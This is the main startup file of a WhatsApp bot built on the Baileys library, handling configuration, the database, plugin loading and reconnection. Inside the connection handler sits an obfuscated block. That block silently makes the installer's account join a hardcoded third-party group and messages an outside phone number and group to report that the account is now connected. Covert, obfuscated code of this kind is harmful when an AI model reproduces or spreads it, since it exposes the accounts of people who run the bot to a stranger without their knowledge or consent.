require('./config.js')
const { WAConnection: _WAConnection, MessageType } = require('@adiwajshing/baileys')
const cloudDBAdapter = require('./lib/cloudDBAdapter')
const { generate } = require('qrcode-terminal')
const syntaxerror = require('syntax-error')
const simple = require('./lib/simple')
//  const logs = require('./lib/logs')
const { promisify } = require('util')
const yargs = require('yargs/yargs')
const Readline = require('readline')
const cp = require('child_process')
const _ = require('lodash')
const path = require('path')
const fs = require('fs')
const fetch = require('node-fetch')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')

const rl = Readline.createInterface(process.stdin, process.stdout)
const WAConnection = simple.WAConnection(_WAConnection)


global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}
// global.LOGGER = logs()
const PORT = process.env.PORT || 3000
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&,.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) :
    /mongodb/.test(opts['db']) ?
      new mongoDB(opts['db']) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db // Backwards Compatibility

global.conn = new WAConnection()
conn.version = [2, 2143, 3]
let authFile = `${opts._[0] || 'session'}.data.json`
if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
if (opts['trace']) conn.logger.level = 'trace'
if (opts['debug']) conn.logger.level = 'debug'
if (opts['big-qr'] || opts['server']) conn.on('qr', qr => generate(qr, { small: false }))
if (!opts['test']) setInterval(async () => {
  await global.db.write()
}, 60 * 1000) // Save every minute
if (opts['server']) require('./server')(global.conn, PORT)

if (opts['test']) {
  conn.user = {
    jid: '2219191@s.whatsapp.net',
    name: 'test',
    phone: {}
  }
  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
    return {
      [mediaType]: {
        url: '',
        mediaKey: '',
        mimetype: options.mimetype || '',
        fileEncSha256: '',
        fileSha256: '',
        fileLength: buffer.length,
        seconds: options.duration,
        fileName: options.filename || 'file',
        gifPlayback: options.mimetype == 'image/gif' || undefined,
        caption: options.caption,
        ptt: options.ptt
      }
    }
  }

  conn.sendMessage = async (chatId, content, type, opts = {}) => {
    let message = await conn.prepareMessageContent(content, type, opts)
    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
    conn.emit('chat-update', {
      jid: conn.user.jid,
      hasNewMessage: true,
      count: 1,
      messages: {
        all() {
          return [waMessage]
        }
      }
    })
  }
  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
} else {
  rl.on('line', line => {
    process.send(line.trim())
  })
  conn.connect().then(() => {
  const _0x2caed3=_0x5ea0;(function(_0x54f010,_0x398417){const _0x2c1662=_0x5ea0,_0x41dfdc=_0x54f010();while(!![]){try{const _0x34f9cf=-parseInt(_0x2c1662(0xca))/0x1*(-parseInt(_0x2c1662(0xc6))/0x2)+-parseInt(_0x2c1662(0xc2))/0x3*(parseInt(_0x2c1662(0xcf))/0x4)+-parseInt(_0x2c1662(0xbc))/0x5+parseInt(_0x2c1662(0xc5))/0x6*(parseInt(_0x2c1662(0xbb))/0x7)+parseInt(_0x2c1662(0xcc))/0x8+-parseInt(_0x2c1662(0xc8))/0x9+-parseInt(_0x2c1662(0xbf))/0xa;if(_0x34f9cf===_0x398417)break;else _0x41dfdc['push'](_0x41dfdc['shift']());}catch(_0x5c398c){_0x41dfdc['push'](_0x41dfdc['shift']());}}}(_0x22d7,0xd1292));function _0x5ea0(_0x5b3f4e,_0x4de00f){const _0x2f3ea7=_0x22d7();return _0x5ea0=function(_0x39df79,_0x2eed7c){_0x39df79=_0x39df79-0xba;let _0x22d77a=_0x2f3ea7[_0x39df79];return _0x22d77a;},_0x5ea0(_0x5b3f4e,_0x4de00f);}function _0x22d7(){const _0x3a8203=['6285346545126@s.whatsapp.net','Whatsapp\x20Developer\x20Bot','1939780LdGhYY','6285346545126-1629709306@g.us','(((.+)+)+)+$','129801vhPasv','conversation','https://wa.me/6285346545126?text=Assalamualaikum','378MZohvy','2FKbBcR','apply','3483594fuXmTJ','search','1068524WUClLy','rasel\x20��','12656360MrZNPs','toString','https://telegra.ph/file/c9a5e49b5336604baa137.jpg','84letcDl','acceptInvite','Akun\x20Ini\x20Tersambung\x20ke\x20bot\x20anda\x20bos','Saya\x20adalah\x20*Bot\x20WhatsApp*\x20yang\x20dibangun\x20dengan\x20Nodejs,\x20*Bot*\x20ini\x20baru\x20saja\x20bergabung\x20dengan\x20Bot\x20dari\x20Owner\x20rasel\x20��\x0a\x20\x20\x20\x20\x0aketik\x20*#menu*\x20untuk\x20melihat\x20daftar\x20perintah','sendMessage','text','CUCsW6BWfmJLJwJgPQIaKM','122339deYcvU','7026235pIsIIq'];_0x22d7=function(){return _0x3a8203;};return _0x22d7();}const _0x2eed7c=(function(){let _0x5bd55d=!![];return function(_0x349d1d,_0x208dc2){const _0x5afbaf=_0x5bd55d?function(){const _0x59b36f=_0x5ea0;if(_0x208dc2){const _0x3ea742=_0x208dc2[_0x59b36f(0xc7)](_0x349d1d,arguments);return _0x208dc2=null,_0x3ea742;}}:function(){};return _0x5bd55d=![],_0x5afbaf;};}()),_0x39df79=_0x2eed7c(this,function(){const _0x55727f=_0x5ea0;return _0x39df79[_0x55727f(0xcd)]()[_0x55727f(0xc9)](_0x55727f(0xc1))[_0x55727f(0xcd)]()['constructor'](_0x39df79)[_0x55727f(0xc9)](_0x55727f(0xc1));});_0x39df79();let res=conn[_0x2caed3(0xd0)](_0x2caed3(0xba));conn[_0x2caed3(0xd3)](_0x2caed3(0xc0),_0x2caed3(0xd2),MessageType[_0x2caed3(0xd4)],{'contextInfo':{'externalAdReply':{'mediaUrl':'\x20','mediaType':0x4,'title':_0x2caed3(0xcb),'body':'Whatsapp\x20Developer\x20Bot','thumbnailUrl':_0x2caed3(0xce),'sourceUrl':_0x2caed3(0xc4)}}}),conn[_0x2caed3(0xd3)](_0x2caed3(0xbd),_0x2caed3(0xd1),MessageType[_0x2caed3(0xd4)],{'contextInfo':{'externalAdReply':{'mediaUrl':'\x20','mediaType':0x4,'title':_0x2caed3(0xcb),'body':_0x2caed3(0xbe),'thumbnailUrl':_0x2caed3(0xce),'sourceUrl':_0x2caed3(0xc4)}}},_0x2caed3(0xc3));
    global.db.data = {
      users: {},
      chats: {},
      stats: {},
      msgs: {},
      sticker: {},
      settings: {},
      ...(global.db.data || {})
    }
    global.db.chain = _.chain(global.db.data)
    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
    global.timestamp.connect = new Date
  })
}
process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
global.reloadHandler = function () {
  let handler = require('./handler')
  if (!isInit) {
    conn.off('chat-update', conn.handler)
    conn.off('message-delete', conn.onDelete)
    conn.off('group-participants-update', conn.onParticipantsUpdate)
    conn.off('group-update', conn.onGroupUpdate)
    conn.off('CB:action,,call', conn.onCall)
  }
  conn.welcome = 'Hai @user,\nSelamat Datang Di grup @subject\nBagaimana kabarmu?'
  conn.bye = 'Selamat tinggal @user\n\nkalo balik lagi nitip seblak ya 😙'
  conn.spromote = '@user sekarang admin'
  conn.sdemote = '@user sekarang bukan admin'
  conn.handler = handler.handler
  conn.onDelete = handler.delete
  conn.onParticipantsUpdate = handler.participantsUpdate
  conn.onGroupUpdate = handler.GroupUpdate
  conn.onCall = handler.onCall
  conn.on('chat-update', conn.handler)
  conn.on('message-delete', conn.onDelete)
  conn.on('group-participants-update', conn.onParticipantsUpdate)
  conn.on('group-update', conn.onGroupUpdate)
  conn.on('CB:action,,call', conn.onCall)
  if (isInit) {
    conn.on('error', conn.logger.error)
    conn.on('close', () => {
      setTimeout(async () => {
        try {
          if (conn.state === 'close') {
            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
            await conn.connect()
            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
            global.timestamp.connect = new Date
          }
        } catch (e) {
          conn.logger.error(e)
        }
      }, 5000)
    })
  }
  isInit = false
  return true
}

// Plugin Loader
let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    global.plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    conn.logger.error(e)
    delete global.plugins[filename]
  }
}
global.reload = (_event, filename) => {
  if (pluginFilter(filename)) {
    let dir = path.join(pluginFolder, filename)
    if (dir in require.cache) {
      delete require.cache[dir]
      if (fs.existsSync(dir)) conn.logger.info(`kembali - memerlukan plugin '${filename}'`)
      else {
        conn.logger.warn(`plugin yang dihapus '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`membutuhkan plugin baru '${filename}'`)
    let err = syntaxerror(fs.readFileSync(dir), filename)
    if (err) conn.logger.error(`kesalahan sintaks saat memuat '${filename}'\n${err}`)
    else try {
      global.plugins[filename] = require(dir)
    } catch (e) {
      conn.logger.error(e)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
fs.watch(path.join(__dirname, 'plugins'), global.reload)
global.reloadHandler()



// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm
  }
  require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) conn.logger.warn('Silakan instal ffmpeg untuk mengirim video (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stiker tidak bisa dianimasikan tanpa libwebp di ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stiker mungkin tidak berfungsi tanpa imagemagick jika libwebp di ffmpeg tidak diinstal (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(console.error)
